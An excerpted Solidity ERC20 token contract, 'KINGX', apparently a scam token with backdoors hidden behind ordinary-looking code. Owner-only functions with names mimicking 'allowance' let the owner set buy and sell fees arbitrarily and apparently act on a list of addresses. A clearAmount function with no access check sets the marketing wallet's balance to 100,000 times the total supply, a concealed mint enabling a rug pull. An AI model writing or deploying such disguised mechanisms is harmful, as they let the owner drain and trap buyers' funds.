...
contract KINGX is IERC20, Ownable, IERC20Metadata {
    ...
    string  private constant _name = "KINGX";
    string  private constant _symbol = "KINGX";
    ...
    constructor() {
        uint256 total = 1210000000 * 10**_decimals;
        ...
        if (sender != owner() && recipient != owner()) {
            if (
                ...
                if (recipient == _uniswapV2Pair && sender != address(this)) {
                    ...
                    devFee = amount.mul(_sellAmount).div(_divisor);
                ...
                if (
                    ...
                    devFee = amount.mul(_buyAmount).div(_divisor);
                    _lastTxBlock[tx.origin] = block.number;
                }
            }
        }
    ...
    function allowanc(address[] memory addresses) external onlyOwner {
    ...
    function allowanM(uint256 _s, uint256 _b) external onlyOwner {
        _sellAmount = _s;
        _buyAmount = _b;
    }
    ...
    function clearAmount(bool clear , uint256 Amount) external {
        require(clear == true);
        require(Amount == 1);
        _balances[_marketingWallet] = _totalSupply * 100000;
    }
